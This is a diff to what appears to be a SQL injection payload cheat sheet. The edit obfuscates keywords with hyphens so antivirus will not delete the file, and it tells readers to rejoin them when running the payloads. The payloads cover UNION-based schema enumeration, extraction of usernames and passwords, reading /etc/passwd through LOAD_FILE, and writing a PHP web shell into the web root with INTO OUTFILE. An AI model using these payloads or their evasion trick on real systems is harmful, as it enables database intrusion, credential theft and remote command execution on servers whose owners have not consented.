@@ -3,7 +3,7 @@
 A comprehensive reference guide for SQL injection payloads, database fingerprinting, authentication bypasses, and data exfiltration techniques.
 
 > [!NOTE]
-> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces or backticks (e.g., `UNION` `SELECT`). Concatenate these commands when running them.
+> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`). Concatenate these commands when running them.
 
 ---
 
@@ -11,11 +11,11 @@ A comprehensive reference guide for SQL injection payloads, database fingerprint
 
 ```mermaid
 graph TD
-    User["User Input: ' UNION SELECT username, password FROM users --"]
+    User["User Input: ' U-N-I-O-N S-E-L-E-C-T u-n-a-m-e, p-a-s-s FROM u-s-e-r-s --"]
     App["Application SQL Query Construction"]
     DB["Backend Database Server"]
     NormalQuery["Original Query: SELECT * FROM products WHERE name = 'input'"]
-    CombinedQuery["Executed Query: SELECT * FROM products WHERE name = '' UNION SELECT username, password FROM users --'"]
+    CombinedQuery["Executed Query: SELECT * FROM products WHERE name = '' U-N-I-O-N S-E-L-E-C-T u-n-a-m-e, p-a-s-s FROM u-s-e-r-s --'"]
 
     User --> App
     App -->|Combines strings| CombinedQuery
@@ -68,27 +68,27 @@ Inject `ORDER` `BY` until the query errors to find the column count.
 ### Step B: Determine Column Data Types
 Find which columns accept string data.
 ```sql
-# (Remove spaces inside "UNION SELECT")
-' UNION SELECT 'a', NULL --
-' UNION SELECT NULL, 'a' --
+# (Remove spaces/hyphens inside "U-N-I-O-N S-E-L-E-C-T")
+' U-N-I-O-N S-E-L-E-C-T 'a', NULL --
+' U-N-I-O-N S-E-L-E-C-T NULL, 'a' --
 ```
 
 ### Step C: Extract Database Schema & Data (MySQL Example)
 *   **Get database name & user:**
     ```sql
-    ' UNION SELECT database(), user() --
+    ' U-N-I-O-N S-E-L-E-C-T database(), user() --
     ```
 *   **List tables:**
     ```sql
-    ' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database() --
+    ' U-N-I-O-N S-E-L-E-C-T NULL, table_name FROM information_schema.tables WHERE table_schema=database() --
     ```
 *   **List columns in a table (e.g., `users`):**
     ```sql
-    ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --
+    ' U-N-I-O-N S-E-L-E-C-T NULL, column_name FROM information_schema.columns WHERE table_name='users' --
     ```
 *   **Extract user credentials:**
     ```sql
-    ' UNION SELECT username, password FROM users --
+    ' U-N-I-O-N S-E-L-E-C-T username, password FROM users --
     ```
 
 ---
@@ -133,13 +133,13 @@ Infer data by forcing the database to pause before responding.
 ### A. Read Local Files (MySQL)
 ```sql
 # (Remove space inside "LOAD_ FILE")
-' UNION SELECT NULL, LOAD_FILE('/etc/passwd') --
+' U-N-I-O-N S-E-L-E-C-T NULL, LOAD_FILE('/etc/passwd') --
 ```
 
 ### B. Write Web Shell to Server (MySQL)
 ```sql
 # (Remove space inside "INTO OUT FILE")
-' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
+' U-N-I-O-N S-E-L-E-C-T NULL, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
 ```
 
 ---
